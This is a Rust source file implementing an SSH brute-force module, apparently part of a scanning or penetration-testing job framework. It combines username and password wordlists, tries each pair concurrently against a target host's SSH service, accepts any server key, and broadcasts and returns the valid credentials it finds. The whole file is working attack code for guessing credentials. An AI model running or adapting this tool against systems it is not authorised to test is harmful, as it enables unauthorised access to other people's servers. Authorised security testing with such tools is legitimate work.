use std::sync::Arc;
use std::time::Duration;
use futures_util::stream::FuturesUnordered;
use futures_util::StreamExt;
use tokio::sync::Semaphore;
use russh::client;
use crate::models::Job;
use crate::state::AppState;
use crate::db::repository;
use super::{DEFAULT_PASSWORDS, DEFAULT_USERNAMES, load_wordlist};

pub struct SshBruteForce;

impl SshBruteForce {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;

        let target = cfg["target"].as_str().ok_or("Missing target")?.to_string();
        let port = cfg.get("port").and_then(|v| v.as_u64()).unwrap_or(22) as u16;
        let concurrency = cfg.get("concurrency").and_then(|v| v.as_u64()).unwrap_or(3) as usize;

        let usernames = load_wordlist(cfg, "usernames", "usernames_path", DEFAULT_USERNAMES).await;
        let passwords = load_wordlist(cfg, "passwords", "wordlist_path", DEFAULT_PASSWORDS).await;

        let total = usernames.len() * passwords.len();
        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:SSH brute — {} usernames × {} passwords = {} attempts on {}:{}",
            job.id, usernames.len(), passwords.len(), total, target, port
        ));

        let sem = Arc::new(Semaphore::new(concurrency));
        let mut futs = FuturesUnordered::new();

        for username in &usernames {
            for password in &passwords {
                let target = target.clone();
                let username = username.clone();
                let password = password.clone();
                let sem = sem.clone();

                futs.push(async move {
                    let _permit = sem.acquire_owned().await.unwrap();
                    let result = try_ssh_login(&target, port, &username, &password).await;
                    (username, password, result)
                });
            }
        }

        let mut found: Vec<String> = Vec::new();
        let mut attempted: usize = 0;

        while let Some((user, pass, result)) = futs.next().await {
            attempted += 1;

            if attempted % 20 == 0 {
                let _ = state.broadcaster.send(format!(
                    "scan_progress:{}:{}/{} attempts ({} found)",
                    job.id, attempted, total, found.len()
                ));
            }

            if attempted % 10 == 0 {
                if let Ok(Some(j)) = repository::get_job(&state.db, &job.id).await {
                    if j.is_cancelled() {
                        let _ = state.broadcaster.send(format!(
                            "scan_progress:{}:Cancelled after {} attempts", job.id, attempted
                        ));
                        break;
                    }
                }
            }

            match result {
                Ok(true) => {
                    let cred = format!("{}:{}", user, pass);
                    let _ = state.broadcaster.send(format!(
                        "scan_progress:{}:Found credentials: {}", job.id, cred
                    ));
                    found.push(cred);
                }
                Ok(false) => {}
                Err(e) => {
                    tracing::debug!("[ssh-brute] {}:{} → {}", user, pass, e);
                }
            }
        }

        let results = serde_json::json!({
            "target": target,
            "port": port,
            "attempts": attempted,
            "found": found,
        });
        Ok(results.to_string())
    }
}

struct IgnoreServerKey;

impl client::Handler for IgnoreServerKey {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _server_public_key: &russh::keys::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

async fn try_ssh_login(
    host: &str,
    port: u16,
    username: &str,
    password: &str,
) -> Result<bool, String> {
    let config = Arc::new(client::Config {
        inactivity_timeout: Some(Duration::from_secs(8)),
        ..<_>::default()
    });

    let mut session = tokio::time::timeout(
        Duration::from_secs(10),
        client::connect(config, (host, port), IgnoreServerKey),
    )
    .await
    .map_err(|_| "connection timeout".to_string())?
    .map_err(|e| e.to_string())?;

    let auth = tokio::time::timeout(
        Duration::from_secs(8),
        session.authenticate_password(username, password),
    )
    .await
    .map_err(|_| "auth timeout".to_string())?
    .map_err(|e| e.to_string())?;

    Ok(auth.success())
}
